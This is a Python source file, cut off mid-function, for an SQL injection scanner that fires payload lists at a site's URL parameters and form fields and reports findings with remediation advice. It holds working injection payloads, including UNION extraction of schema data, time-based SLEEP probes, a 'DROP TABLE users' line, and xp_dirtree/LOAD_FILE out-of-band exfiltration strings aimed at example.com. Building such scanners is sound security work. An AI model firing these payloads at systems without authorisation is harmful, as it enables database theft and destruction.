import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
import re
import time
import random
from bs4 import BeautifulSoup
import difflib

class SQLInjectionScanner:
    def __init__(self):
        # Error-based SQL injection payloads
        self.error_payloads = [
            "' OR '1'='1", 
            "' OR '1'='1' --", 
            "' OR '1'='1' #", 
            "' OR '1'='1'/*", 
            "') OR ('1'='1", 
            "') OR ('1'='1' --", 
            "1' OR '1'='1", 
            "1' OR '1'='1' --", 
            "' UNION SELECT 1,2,3 --", 
            "' UNION SELECT 1,2,3,4 --", 
            "' UNION SELECT 1,2,3,4,5 --",
            "1; DROP TABLE users --",
            "1'; DROP TABLE users --",
            "' OR 1=1 --",
            "admin' --",
            "admin' #",
            "' OR '1'='1' LIMIT 1 --",
            "\" OR \"1\"=\"1",
            "\" OR \"1\"=\"1\" --",
            "\" OR \"1\"=\"1\" #",
            "\" OR \"1\"=\"1\"/*",
            "\") OR (\"1\"=\"1",
            "\") OR (\"1\"=\"1\" --",
            "1\" OR \"1\"=\"1",
            "1\" OR \"1\"=\"1\" --",
            "' OR 1=1 LIMIT 1 -- -+",
            "' OR 1=1 LIMIT 1 -- -+",
            "' OR 'x'='x",
            "' AND id IS NULL; --",
            "' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10 --",
            "' UNION ALL SELECT @@version --",
            "' UNION ALL SELECT table_name,2 FROM information_schema.tables --",
            "' AND 1=convert(int,(SELECT @@version)) --",
            "' AND 1=convert(int,(SELECT user)) --",
            "' AND 1=convert(int,(SELECT @@servername)) --",
            "' AND 1=convert(int,(SELECT DB_NAME())) --"
        ]
        
        # Time-based blind SQL injection payloads
        self.time_payloads = [
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a) AND '1'='1",
            "\" AND (SELECT * FROM (SELECT(SLEEP(5)))a) AND \"1\"=\"1",
            "' OR (SELECT * FROM (SELECT(SLEEP(5)))a) --",
            "\" OR (SELECT * FROM (SELECT(SLEEP(5)))a) --",
            "' AND SLEEP(5) --",
            "\" AND SLEEP(5) --",
            "' AND SLEEP(5) AND '1'='1",
            "' OR SLEEP(5) --",
            "1' AND SLEEP(5) AND '1'='1",
            "' WAITFOR DELAY '0:0:5' --",
            "\" WAITFOR DELAY '0:0:5' --",
            "' WAITFOR DELAY '0:0:5' AND '1'='1",
            "' OR WAITFOR DELAY '0:0:5' --",
            "1' WAITFOR DELAY '0:0:5' AND '1'='1",
            "'; SELECT pg_sleep(5) --",
            "\"; SELECT pg_sleep(5) --",
            "' AND (SELECT 1 FROM PG_SLEEP(5)) --",
            "' OR (SELECT 1 FROM PG_SLEEP(5)) --",
            "' AND 1=(SELECT 1 FROM PG_SLEEP(5)) --",
            "' AND 1=(SELECT 1 FROM (SELECT pg_sleep(5))a) --",
            "'; SELECT BENCHMARK(10000000,MD5('A')) --",
            "'; SELECT BENCHMARK(10000000,MD5('A')) #",
            "' OR BENCHMARK(10000000,MD5('A')) --",
            "' OR BENCHMARK(10000000,MD5('A')) #",
            "' AND BENCHMARK(10000000,MD5('A')) --",
            "' AND BENCHMARK(10000000,MD5('A')) #"
        ]
        
        # Boolean-based blind SQL injection payloads
        self.boolean_payloads = [
            "' AND 1=1 --",
            "' AND 1=2 --",
            "' AND 'a'='a' --",
            "' AND 'a'='b' --",
            "' OR 'a'='a' --",
            "' OR 'a'='b' --",
            "\" AND 1=1 --",
            "\" AND 1=2 --",
            "\" AND \"a\"=\"a\" --",
            "\" AND \"a\"=\"b\" --",
            "\" OR \"a\"=\"a\" --",
            "\" OR \"a\"=\"b\" --",
            "' AND 1=1 #",
            "' AND 1=2 #",
            "\" AND 1=1 #",
            "\" AND 1=2 #",
            "' AND 1=1 AND 'a'='a",
            "' AND 1=2 AND 'a'='a",
            "\" AND 1=1 AND \"a\"=\"a",
            "\" AND 1=2 AND \"a\"=\"a"
        ]
        
        # Combine all payloads
        self.payloads = self.error_payloads + self.time_payloads + self.boolean_payloads
        
        # SQL error patterns for different database types
        self.error_patterns = [
            # MySQL
            "SQL syntax.*?MySQL", 
            "Warning.*?\\Wmysqli?_", 
            "MySQLSyntaxErrorException", 
            "valid MySQL result", 
            "check the manual that corresponds to your (MySQL|MariaDB) server version",
            "MySqlException",
            "MySqlClient\\.",
            
            # Oracle
            "ORA-[0-9][0-9][0-9][0-9]",
            "Oracle error",
            "Oracle.*?Driver",
            "Warning.*?\\Woci_",
            "Oracle.*?Database",
            
            # Microsoft SQL Server
            "Microsoft OLE DB Provider for ODBC Drivers error",
            "ODBC SQL Server Driver",
            "ODBC Error",
            "Microsoft OLE DB Provider for SQL Server",
            "Unclosed quotation mark after the character string",
            "\\[SQL Server\\]",
            "\\[ODBC SQL Server Driver\\]",
            "\\[SQLServer JDBC Driver\\]",
            "System\\.Data\\.SqlClient\\.SqlException",
            "(?i)Exception.*?\\WSystem\\.Data\\.SqlClient\\.",
            "Unclosed quotation mark after the character string",
            "\\[Microsoft\\]\\[ODBC SQL Server Driver\\]",
            "Incorrect syntax near",
            
            # PostgreSQL
            "PostgreSQL.*?ERROR",
            "Warning.*?\\Wpg_",
            "valid PostgreSQL result",
            "Npgsql\\.",
            "PG::SyntaxError:",
            "org\\.postgresql\\.util\\.PSQLException",
            "ERROR:\\s\\ssyntax error at or near ",
            "ERROR: parser: parse error at or near",
            
            # SQLite
            "SQLite/JDBCDriver",
            "SQLite\\.Exception",
            "System\\.Data\\.SQLite\\.SQLiteException",
            "Warning.*?\\W(?:sqlite_|SQLite3::)",
            "\\[SQLITE_ERROR\\]",
            "SQL error.*?near",
            
            # Generic SQL errors
            "Syntax error or access violation",
            "Unexpected end of command in statement",
            "Invalid SQL statement",
            "SQL command not properly ended",
            "Error in SQL syntax",
            "SQL syntax error",
            "SQLSTATE\\[",
            "\\[SQL\\]"
        ]
        
    def scan(self, url, options=None):
        """Scan a URL for SQL injection vulnerabilities with enhanced thoroughness"""
        vulnerabilities = []
        options = options or {}
        
        # Set timeout based on options or use default
        timeout = options.get('timeout', 15)  # Increased from 10 to 15
        thorough = options.get('thorough', False)
        
        # Use baseline response if provided
        baseline_response = options.get('baseline_response')
        
        # Set user agent
        headers = {
            'User-Agent': options.get('user_agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36')
        }
        
        # Check if URL has parameters
        parsed_url = urlparse(url)
        params = parse_qs(parsed_url.query)
        
        # If thorough mode, also check for hidden parameters
        if thorough and not params:
            # Try common parameter names to discover hidden parameters
            common_params = ['id', 'page', 'user', 'username', 'password', 'query', 'search', 'category', 'cat', 'action', 'item', 'product']
            for param in common_params:
                test_url = f"{url}{'&' if '?' in url else '?'}{param}=1"
                try:
                    response = requests.get(test_url, timeout=timeout, headers=headers)
                    # If response is different from baseline, we might have found a parameter
                    if baseline_response and self._compare_responses(baseline_response.text, response.text) < 0.95:
                        # Add this parameter to our test list
                        parsed_test_url = urlparse(test_url)
                        params = parse_qs(parsed_test_url.query)
                        break
                except Exception as e:
                    print(f"Error testing parameter discovery on {url}: {str(e)}")
        
        if not params:
            # Try to find forms on the page
            try:
                if baseline_response:
                    response = baseline_response
                else:
                    response = requests.get(url, timeout=timeout, headers=headers)
                    
                forms = self._extract_forms(response.text)
                
                for form in forms:
                    # In thorough mode, test each form with more payloads
                    if thorough:
                        # Use all payloads for thorough testing
                        form_vulnerabilities = self._test_form(url, form, self.payloads, timeout, headers)
                    else:
                        # Use a subset of payloads for faster testing
                        test_payloads = self.error_payloads[:5] + self.time_payloads[:3] + self.boolean_payloads[:3]
                        form_vulnerabilities = self._test_form(url, form, test_payloads, timeout, headers)
                        
                    vulnerabilities.extend(form_vulnerabilities)
                    
            except Exception as e:
                print(f"Error fetching {url}: {str(e)}")
                
            return vulnerabilities
            
        # Test each parameter in the URL for SQL injection
        for param in params:
            # First, get a baseline response if not already provided
            if options.get('baseline_response'):
                baseline_response = options.get('baseline_response')
            else:
                try:
                    baseline_response = requests.get(url, timeout=timeout, headers=headers)
                except Exception as e:
                    print(f"Error fetching baseline for {url}: {str(e)}")
                    continue
            
            # In thorough mode, test with all payloads
            if thorough:
                # Test error-based SQL injection with all payloads
                for payload in self.error_payloads:
                    # Add random delay between requests to avoid rate limiting
                    if thorough:
                        time.sleep(random.uniform(0.5, 1.5))
                        
                    if not self._test_parameter(url, param, payload, baseline_response, vulnerabilities, "Error-based", 
                                              timeout=timeout, headers=headers):
                        break  # If vulnerability found, move to next parameter
                
                # Test time-based blind SQL injection with all payloads
                for payload in self.time_payloads:
                    # Add random delay between requests to avoid rate limiting
                    if thorough:
                        time.sleep(random.uniform(0.5, 1.5))
                    
                    if not self._test_parameter(url, param, payload, baseline_response, vulnerabilities, "Time-based", 
                                              time_based=True, timeout=timeout, headers=headers):
                        break  # If vulnerability found, move to next parameter
                
                # Test boolean-based blind SQL injection with all payloads
                self._test_boolean_based(url, param, baseline_response, vulnerabilities, timeout=timeout, headers=headers)
                
                # Test for stacked queries (more advanced)
                self._test_stacked_queries(url, param, baseline_response, vulnerabilities, timeout=timeout, headers=headers)
                
                # Test for out-of-band SQL injection (more advanced)
                self._test_out_of_band(url, param, vulnerabilities, timeout=timeout, headers=headers)
            else:
                # Use a subset of payloads for faster testing
                # Test error-based SQL injection with limited payloads
                for payload in self.error_payloads[:8]:  # Test with first 8 payloads
                    if not self._test_parameter(url, param, payload, baseline_response, vulnerabilities, "Error-based", 
                                              timeout=timeout, headers=headers):
                        break  # If vulnerability found, move to next parameter
                
                # Test time-based blind SQL injection with limited payloads
                for payload in self.time_payloads[:5]:  # Test with first 5 payloads
                    if not self._test_parameter(url, param, payload, baseline_response, vulnerabilities, "Time-based", 
                                              time_based=True, timeout=timeout, headers=headers):
                        break  # If vulnerability found, move to next parameter
                
                # Test boolean-based blind SQL injection with limited payloads
                test_pairs = [
                    ("' AND 1=1 --", "' AND 1=2 --"),
                    ("\" AND 1=1 --", "\" AND 1=2 --")
                ]
                self._test_boolean_based_with_pairs(url, param, baseline_response, vulnerabilities, test_pairs, 
                                                  timeout=timeout, headers=headers)
        
        # Add confidence levels to vulnerabilities
        for vuln in vulnerabilities:
            if "Time-based" in vuln['type'] or "Error-based" in vuln['type']:
                vuln['confidence'] = 'High'
            else:
                vuln['confidence'] = 'Medium'
        
        return vulnerabilities
    
    def _test_parameter(self, url, param, payload, baseline_response, vulnerabilities, injection_type, 
                      time_based=False, timeout=15, headers=None):
        """Test a parameter for SQL injection vulnerabilities with enhanced detection"""
        parsed_url = urlparse(url)
        params = parse_qs(parsed_url.query)
        headers = headers or {}
        
        # Create a new set of parameters with the payload
        new_params = params.copy()
        new_params[param] = [payload]
        
        # Rebuild the URL with the new parameters
        query_string = urlencode(new_params, doseq=True)
        new_url = urlunparse((
            parsed_url.scheme,
            parsed_url.netloc,
            parsed_url.path,
            parsed_url.params,
            query_string,
            parsed_url.fragment
        ))
        
        # Send the request
        try:
            if time_based:
                # For time-based tests, use a longer timeout
                extended_timeout = timeout * 2
                
                # Send the request and measure time
                start_time = time.time()
                response = requests.get(new_url, timeout=extended_timeout, headers=headers)
                end_time = time.time()
                
                response_time = end_time - start_time
                
                # If response time is significantly longer, it might be vulnerable
                # Use a dynamic threshold based on the payload
                sleep_time = 5  # Default sleep time in payloads
                
                # Extract sleep time from payload if possible
                sleep_match = re.search(r'SLEEP\((\d+)\)', payload, re.IGNORECASE)
                if sleep_match:
                    sleep_time = int(sleep_match.group(1))
                
                delay_match = re.search(r"DELAY '0:0:(\d+)'", payload, re.IGNORECASE)
                if delay_match:
                    sleep_time = int(delay_match.group(1))
                
                pg_sleep_match = re.search(r'pg_sleep\((\d+)\)', payload, re.IGNORECASE)
                if pg_sleep_match:
                    sleep_time = int(pg_sleep_match.group(1))
                
                # If response time is close to the sleep time, it's likely vulnerable
                if response_time > (sleep_time * 0.8):
                    vulnerabilities.append({
                        'type': f'Time-based Blind SQL Injection',
                        'url': url,
                        'parameter': param,
                        'payload': payload,
                        'evidence': f'Response time: {response_time:.2f} seconds (expected delay: {sleep_time} seconds)',
                        'severity': 'High',
                        'description': 'Time-based blind SQL injection vulnerability detected. The application appears to be vulnerable to time-based blind SQL injection attacks.',
                        'remediation': 'Use parameterized queries or prepared statements. Validate and sanitize all user inputs. Implement proper error handling and set query timeouts.',
                        'confidence': 'High' if response_time > sleep_time else 'Medium'
                    })
                    return False  # Vulnerability found
            else:
                # For error-based tests
                response = requests.get(new_url, timeout=timeout, headers=headers)
                
                # Compare with baseline to detect significant changes
                baseline_content = baseline_response.text if baseline_response else ""
                
                # Check for SQL errors in the response
                for pattern in self.error_patterns:
                    if re.search(pattern, response.text, re.IGNORECASE):
                        # Verify the error wasn't in the baseline
                        if not re.search(pattern, baseline_content, re.IGNORECASE):
                            vulnerabilities.append({
                                'type': f'{injection_type} SQL Injection',
                                'url': url,
                                'parameter': param,
                                'payload': payload,
                                'evidence': f'SQL error pattern detected: {pattern}',
                                'severity': 'High',
                                'description': f'{injection_type} SQL injection vulnerability detected. The application appears to be vulnerable to SQL injection attacks.',
                                'remediation': 'Use parameterized queries or prepared statements. Validate and sanitize all user inputs. Implement proper error handling.',
                                'confidence': 'High'
                            })
                            return False  # Vulnerability found
                
                # Check for other indicators of successful injection
                # 1. Check if the response is significantly different from baseline
                if baseline_response and self._compare_responses(baseline_response.text, response.text) < 0.7:
                    # Significant difference in response might indicate successful injection
                    vulnerabilities.append({
                        'type': f'Potential {injection_type} SQL Injection',
                        'url': url,
                        'parameter': param,
                        'payload': payload,
                        'evidence': f'Significant response difference detected',
                        'severity': 'Medium',
                        'description': f'Potential {injection_type} SQL injection vulnerability detected. The application returns significantly different responses when SQL syntax is manipulated.',
                        'remediation': 'Use parameterized queries or prepared statements. Validate and sanitize all user inputs. Implement proper error handling.',
                        'confidence': 'Medium'
                    })
                    return False  # Potential vulnerability found
                
                # 2. Check for specific content that might indicate successful injection
                if "admin" in payload.lower() and ("admin" in response.text.lower() or "administrator" in response.text.lower()) and \
                   "admin" not in baseline_content.lower() and "administrator" not in baseline_content.lower():
                    vulnerabilities.append({
                        'type': f'Potential {injection_type} SQL Injection',
                        'url': url,
                        'parameter': param,
                        'payload': payload,
                        'evidence': f'Admin-related content appeared in response',
                        'severity': 'High',
                        'description': f'Potential {injection_type} SQL injection vulnerability detected. The application may be revealing admin data when SQL syntax is manipulated.',
                        'remediation': 'Use parameterized queries or prepared statements. Validate and sanitize all user inputs. Implement proper error handling.',
                        'confidence': 'Medium'
                    })
                    return False  # Potential vulnerability found
        
        except Exception as e:
            # Timeout might indicate a successful time-based SQL injection
            if isinstance(e, requests.Timeout) and time_based:
                vulnerabilities.append({
                    'type': 'Time-based Blind SQL Injection',
                    'url': url,
                    'parameter': param,
                    'payload': payload,
                    'evidence': 'Request timed out',
                    'severity': 'High',
                    'description': 'Time-based blind SQL injection vulnerability detected. The application appears to be vulnerable to time-based blind SQL injection attacks.',
                    'remediation': 'Use parameterized queries or prepared statements. Validate and sanitize all user inputs. Implement proper error handling and set query timeouts.',
                    'confidence': 'High'
                })
                return False  # Vulnerability found
            else:
                print(f"Error testing {url} with payload {payload}: {str(e)}")
        
        return True  # Continue testing
    
    def _test_boolean_based(self, url, param, baseline_response, vulnerabilities, timeout=15, headers=None):
        """Test for boolean-based blind SQL injection by comparing responses"""
        # Test pairs of true/false conditions
        test_pairs = [
            ("' AND 1=1 --", "' AND 1=2 --"),
            ("' AND 'a'='a' --", "' AND 'a'='b' --"),
            ("\" AND 1=1 --", "\" AND 1=2 --"),
            ("\" AND \"a\"=\"a\" --", "\" AND \"a\"=\"b\" --"),
            ("' AND 1=1 #", "' AND 1=2 #"),
            ("\" AND 1=1 #", "\" AND 1=2 #"),
            ("' AND 1=1 AND 'a'='a", "' AND 1=2 AND 'a'='a"),
            ("\" AND 1=1 AND \"a\"=\"a", "\" AND 1=2 AND \"a\"=\"a"),
            ("') AND (1=1) --", "') AND (1=2) --"),
            ("\") AND (1=1) --", "\") AND (1=2) --")
        ]
        
        self._test_boolean_based_with_pairs(url, param, baseline_response, vulnerabilities, test_pairs, timeout, headers)
    
    def _test_boolean_based_with_pairs(self, url, param, baseline_response, vulnerabilities, test_pairs, timeout=15, headers=None):
        """Test for boolean-based blind SQL injection with specific test pairs"""
        parsed_url = urlparse(url)
        params = parse_qs(parsed_url.query)
        headers = headers or {}
        
        for true_payload, false_payload in test_pairs:
            # Test with TRUE condition
            true_params = params.copy()
            true_params[param] = [true_payload]
            true_query = urlencode(true_params, doseq=True)
            true_url = urlunparse((
                parsed_url.scheme,
                parsed_url.netloc,
                parsed_url.path,
                parsed_url.params,
                true_query,
                parsed_url.fragment
            ))
            
            # Test with FALSE condition
            false_params = params.copy()
            false_params[param] = [false_payload]
            false_query = urlencode(false_params, doseq=True)
            false_url = urlunparse((
                parsed_url.scheme,
                parsed_url.netloc,
                parsed_url.path,
                parsed_url.params,
                false_query,
                parsed_url.fragment
            ))
            
            try:
                # Add a small delay between requests
                time.sleep(0.5)
                
                true_response = requests.get(true_url, timeout=timeout, headers=headers)
                
                # Add a small delay between requests
                time.sleep(0.5)
                
                false_response = requests.get(false_url, timeout=timeout, headers=headers)
                
                # Compare responses
                if true_response.status_code == 200 and false_response.status_code == 200:
                    # Check if responses are significantly different
                    similarity = self._compare_responses(true_response.text, false_response.text)
                    
                    # Also compare with baseline
                    baseline_true_similarity = self._compare_responses(baseline_response.text, true_response.text)
                    baseline_false_similarity = self._compare_responses(baseline_response.text, false_response.text)
                    
                    # If true condition is similar to baseline but false is different, or vice versa
                    if (similarity < 0.9 and  # Responses are different from each other
                        ((baseline_true_similarity > 0.9 and baseline_false_similarity < 0.9) or  # TRUE similar to baseline, FALSE different
                         (baseline_true_similarity < 0.9 and baseline_false_similarity > 0.9))):  # FALSE similar to baseline, TRUE different
                        
                        # Calculate confidence based on similarity difference
                        confidence = 'High' if similarity < 0.7 else 'Medium'
                        
                        vulnerabilities.append({
                            'type': 'Boolean-based Blind SQL Injection',
                            'url': url,
                            'parameter': param,
                            'payload': f'TRUE: {true_payload}, FALSE: {false_payload}',
                            'evidence': f'Response difference: {(1-similarity)*100:.2f}%',
                            'severity': 'High',
                            'description': 'Boolean-based blind SQL injection vulnerability detected. The application returns different responses for TRUE and FALSE conditions.',
                            'remediation': 'Use parameterized queries or prepared statements. Validate and sanitize all user inputs. Implement proper error handling.',
                            'confidence': confidence
                        })
                        return  # Vulnerability found
                
                # Also check for different status codes
                elif true_response.status_code != false_response.status_code:
                    vulnerabilities.append({
                        'type': 'Boolean-based Blind SQL Injection',
                        'url': url,
                        'parameter': param,
                        'payload': f'TRUE: {true_payload}, FALSE: {false_payload}',
                        'evidence': f'Different status codes: TRUE={true_response.status_code}, FALSE={false_response.status_code}',
                        'severity': 'High',
                        'description': 'Boolean-based blind SQL injection vulnerability detected. The application returns different status codes for TRUE and FALSE conditions.',
                        'remediation': 'Use parameterized queries or prepared statements. Validate and sanitize all user inputs. Implement proper error handling.',
                        'confidence': 'High'
                    })
                    return  # Vulnerability found
                
            except Exception as e:
                print(f"Error testing boolean-based injection on {url}: {str(e)}")
    
    def _test_stacked_queries(self, url, param, baseline_response, vulnerabilities, timeout=15, headers=None):
        """Test for stacked queries SQL injection"""
        parsed_url = urlparse(url)
        params = parse_qs(parsed_url.query)
        headers = headers or {}
        
        # Stacked query payloads
        stacked_payloads = [
            "1; SELECT SLEEP(5) --",
            "1'; SELECT SLEEP(5) --",
            "1\"; SELECT SLEEP(5) --",
            "1); SELECT SLEEP(5) --",
            "1'); SELECT SLEEP(5) --",
            "1\"); SELECT SLEEP(5) --"
        ]
        
        for payload in stacked_payloads:
            # Create a new set of parameters with the payload
            new_params = params.copy()
            new_params[param] = [payload]
            
            # Rebuild the URL with the new parameters
            query_string = urlencode(new_params, doseq=True)
            new_url = urlunparse((
                parsed_url.scheme,
                parsed_url.netloc,
                parsed_url.path,
                parsed_url.params,
                query_string,
                parsed_url.fragment
            ))
            
            try:
                # Send the request and measure time
                start_time = time.time()
                response = requests.get(new_url, timeout=timeout*2, headers=headers)  # Double timeout for sleep
                end_time = time.time()
                
                # If response time is significantly longer, it might be vulnerable to stacked queries
                if end_time - start_time > 4.5:  # Slightly less than the sleep time to account for network variance
                    vulnerabilities.append({
                        'type': 'Stacked Queries SQL Injection',
                        'url': url,
                        'parameter': param,
                        'payload': payload,
                        'evidence': f'Response time: {end_time - start_time:.2f} seconds',
                        'severity': 'High',
                        'description': 'Stacked queries SQL injection vulnerability detected. The application appears to be executing multiple SQL statements in a single query.',
                        'remediation': 'Use parameterized queries or prepared statements. Validate and sanitize all user inputs. Disable stacked queries if possible.',
                        'confidence': 'High'
                    })
                    return  # Vulnerability found
            
            except Exception as e:
                # Timeout might indicate a successful stacked query
                if isinstance(e, requests.Timeout):
                    vulnerabilities.append({
                        'type': 'Stacked Queries SQL Injection',
                        'url': url,
                        'parameter': param,
                        'payload': payload,
                        'evidence': 'Request timed out',
                        'severity': 'High',
                        'description': 'Stacked queries SQL injection vulnerability detected. The application appears to be executing multiple SQL statements in a single query.',
                        'remediation': 'Use parameterized queries or prepared statements. Validate and sanitize all user inputs. Disable stacked queries if possible.',
                        'confidence': 'Medium'
                    })
                    return  # Vulnerability found
                else:
                    print(f"Error testing stacked queries on {url}: {str(e)}")
    
    def _test_out_of_band(self, url, param, vulnerabilities, timeout=15, headers=None):
        """Test for out-of-band SQL injection (DNS/HTTP callbacks)"""
        # Note: This is a placeholder for out-of-band testing
        # In a real implementation, you would use a service like Burp Collaborator or a custom DNS server
        # For this implementation, we'll just add a note about potential out-of-band vulnerabilities
        
        parsed_url = urlparse(url)
        params = parse_qs(parsed_url.query)
        headers = headers or {}
        
        # Out-of-band payloads (these won't actually trigger callbacks in this implementation)
        oob_payloads = [
            "'; SELECT LOAD_FILE(CONCAT('\\\\\\\\', (SELECT DATABASE()), '.example.com\\\\share\\\\file')) --",
            "'; EXEC master..xp_dirtree '\\\\example.com\\share' --",
            "'; DECLARE @q VARCHAR(8000); SET @q = CONCAT('\\\\', (SELECT @@version), '.example.com\\share\\file'); EXEC master..xp_dirtree @q --"
        ]
        
        # Add a note about out-of-band testing
        vulnerabilities.append({
            'type': 'Note: Out-of-Band SQL Injection',
            'url': url,
            'parameter': param,
            'payload': 'Out-of-band testing payloads',
            'evidence': 'Out-of-band testing requires external services',
            'severity': 'Info',
            'description': 'Out-of-band SQL injection testing was skipped. This type of testing requires external services to capture DNS or HTTP callbacks. Consider using tools like Burp Collaborator for out-of-band testing.',
            'remediation': 'Use parameterized queries or prepared statements. Validate and sanitize all user inputs. Block outbound connections from the database server.',
            'confidence': 'Info'
        })
    
    def _compare_responses(self, response1, response2):
        """Compare two responses and return similarity ratio"""
        # Clean HTML to focus on content
        soup1 = BeautifulSoup(response1, 'html.parser')
        soup2 = BeautifulSoup(response2, 'html.parser')
        
        text1 = soup1.get_text()
        text2 = soup2.get_text()
        
        # Calculate similarity ratio
        matcher = difflib.SequenceMatcher(None, text1, text2)
        return matcher.ratio()
    
    def _extract_forms(self, html):
        """Extract forms from HTML content"""
        soup = BeautifulSoup(html, 'html.parser')
        forms = []
        
        for form in soup.find_all('form'):
            form_details = {}
            form_details['action'] = form.get('action', '')
            form_details['method'] = form.get('method', 'get').lower()
            form_details['inputs'] = []
            
            for input_tag in form.find_all(['input', 'textarea', 'select']):
                input_type = input_tag.get('type', 'text')
                input_name = input_tag.get('name', '')
                
                if input_name and input_type != 'submit' and input_type != 'hidden':
                    form_details['inputs'].append({
                        'type': input_type,
                        'name': input_name,
                        'value': input_tag.get('value', '')
                    })
            
            forms.append(form_details)
        
        return forms
    
    def _test_form(self, base_url, form, payloads=None, timeout=15, headers=None):
        """Test a form for SQL injection vulnerabilities with enhanced detection"""
        vulnerabilities = []
        headers = headers or {}
        
        # Use provided payloads or all payloads
        payloads = payloads or self.payloads
        
        # Determine the form submission URL
        action = form['action']
        if not action:
            action = base_url
        elif not action.startswith(('http://', 'https://')):
            # Relative URL
            parsed_url = urlparse(base_url)
            action = f"{parsed_url.scheme}://{parsed_url.netloc}{action}"
        
        # Get baseline response
        baseline_data = {}
        for field in form['inputs']:
            baseline_data[field['name']] = field['value'] or 'test'
        
        try:
            if form['method'] == 'post':
                baseline_response = requests.post(action, data=baseline_data, timeout=timeout, headers=headers)
            else:
                baseline_response = requests.get(action, params=baseline_data, timeout=timeout, headers=headers)
        except Exception as e:
            print(f"Error fetching baseline for form at {action}: {str(e)}")
            return vulnerabilities
        
        # Test each input field
        for input_field in form['inputs']:
            # Skip file inputs as they require different handling
            if input_field['type'] == 'file':
                continue
                
            # Test with different payload types
            # First, identify error-based and time-based payloads
            error_payloads = [p for p in payloads if any(pattern in p.upper() for pattern in ['OR', 'UNION', 'SELECT', 'FROM', 'WHERE'])]
            time_payloads = [p for p in payloads if any(pattern in p.upper() for pattern in ['SLEEP', 'DELAY', 'BENCHMARK', 'PG_SLEEP'])]
            
            # Test error-based SQL injection
            for payload in error_payloads[:min(len(error_payloads), 20)]:  # Limit to 20 payloads for efficiency
                if not self._test_form_field(form, action, input_field, payload, baseline_response, vulnerabilities, 
                                           "Error-based", timeout=timeout, headers=headers):
                    break  # If vulnerability found, move to next field
            
            # Test time-based blind SQL injection
            for payload in time_payloads[:min(len(time_payloads), 10)]:  # Limit to 10 payloads for efficiency
                if not self._test_form_field(form, action, input_field, payload, baseline_response, vulnerabilities, 
                                           "Time-based", time_based=True, timeout=timeout, headers=headers):
                    break  # If vulnerability found, move to next field
            
            # Test boolean-based blind SQL injection
            test_pairs = [
                ("' AND 1=1 --", "' AND 1=2 --"),
                ("\" AND 1=1 --", "\" AND 1=2 --"),
                ("' AND 'a'='a' --", "' AND 'a'='b' --"),
                ("\" AND \"a\"=\"a\" --", "\" AND \"a\"=\"b\" --")
            ]
            self._test_form_boolean_based(form, action, input_field, baseline_response, vulnerabilities, 
                                        test_pairs, timeout=timeout, headers=headers)
            
            # Test for stacked queries in forms
            self._test_form_stacked_queries(form, action, input_field, baseline_response, vulnerabilities, 
                                          timeout=timeout, headers=headers)
        
        return vulnerabilities
    
    def _test_form_field(self, form, action, input_field, payload, baseline_response, vulnerabilities, 
                        injection_type, time_based=False, timeout=15, headers=None):
        """Test a form field for SQL injection vulnerabilities with enhanced detection"""
        headers = headers or {}
        
        # Prepare the form data
        data = {}
        for field in form['inputs']:
            if field['name'] == input_field['name']:
                data[field['name']] = payload
            else:
                data[field['name']] = field['value'] or 'test'
        
        try:
            if time_based:
                # For time-based tests, use a longer timeout
                extended_timeout = timeout * 2
                
                # Extract sleep time from payload if possible
                sleep_time = 5  # Default sleep time in payloads
                
                sleep_match = re.search(r'SLEEP\((\d+)\)', payload, re.IGNORECASE)
                if sleep_match:
                    sleep_time = int(sleep_match.group(1))
                
                delay_match = re.search(r"DELAY '0:0:(\d+)'", payload, re.IGNORECASE)
                if delay_match:
                    sleep_time = int(delay_match.group(1))
                
                pg_sleep_match = re.search(r'pg_sleep\((\d+)\)', payload, re.IGNORECASE)
                if pg_sleep_match:
                    sleep_time = int(pg_sleep_match.group(1))
                
                # Send the request and measure time
                start_time = time.time()
                if form['method'] == 'post':
                    response = requests.post(action, data=data, timeout=extended_timeout, headers=headers)
                else:
                    response = requests.get(action, params=data, timeout=extended_timeout, headers=headers)
                end_time = time.time()
                
                response_time = end_time - start_time
                
                # If response time is close to the sleep time, it's likely vulnerable
                if response_time > (sleep_time * 0.8):
                    vulnerabilities.append({
                        'type': f'Time-based Blind SQL Injection (Form)',
                        'url': action,
                        'parameter': input_field['name'],
                        'payload': payload,
                        'evidence': f'Response time: {response_time:.2f} seconds (expected delay: {sleep_time} seconds)',
                        'severity': 'High',
                        'description': 'Time-based blind SQL injection vulnerability detected in a form. The application appears to be vulnerable to time-based blind SQL injection attacks.',
                        'remediation': 'Use parameterized queries or prepared statements. Validate and sanitize all user inputs. Implement proper error handling and set query timeouts.',
                        'confidence': 'High' if response_time > sleep_time else 'Medium'
                    })
                    return False  # Vulnerability found
            else:
                # For error-based tests
                if form['method'] == 'post':
                    response = requests.post(action, data=data, timeout=timeout, headers=headers)
                else:
                    response = requests.get(action, params=data, timeout=timeout, headers=headers)
                
                # Check for SQL errors in the response
                for pattern in self.error_patterns:
                    if re.search(pattern, response.text, re.IGNORECASE):
                        # Verify the error wasn't in the baseline
                        if not re.search(pattern, baseline_response.text, re.IGNORECASE):
                            vulnerabilities.append({
                                'type': f'{injection_type} SQL Injection (Form)',
                                'url': action,
                                'parameter': input_field['name'],
                                'payload': payload,
                                'evidence': f'SQL error pattern detected: {pattern}',
                                'severity': 'High',
                                'description': f'{injection_type} SQL injection vulnerability detected in a form. The application appears to be vulnerable to SQL injection attacks.',
                                'remediation': 'Use parameterized queries or prepared statements. Validate and sanitize all user inputs. Implement proper error handling.',
                                'confidence': 'High'
                            })
                            return False  # Vulnerability found
                
                # Check for other indicators of successful injection
                # 1. Check if the response is significantly different from baseline
                if self._compare_responses(baseline_response.text, response.text) < 0.7:
                    # Significant difference in response might indicate successful injection
                    vulnerabilities.append({
                        'type': f'Potential {injection_type} SQL Injection (Form)',
                        'url': action,
                        'parameter': input_field['name'],
                        'payload': payload,
                        'evidence': f'Significant response difference detected',
                        'severity': 'Medium',
                        'description': f'Potential {injection_type} SQL injection vulnerability detected in a form. The application returns significantly different responses when SQL syntax is manipulated.',
                        'remediation': 'Use parameterized queries or prepared statements. Validate and sanitize all user inputs. Implement proper error handling.',
                        'confidence': 'Medium'
                    })
                    return False  # Potential vulnerability found
        
        except Exception as e:
            # Timeout might indicate a successful time-based SQL injection
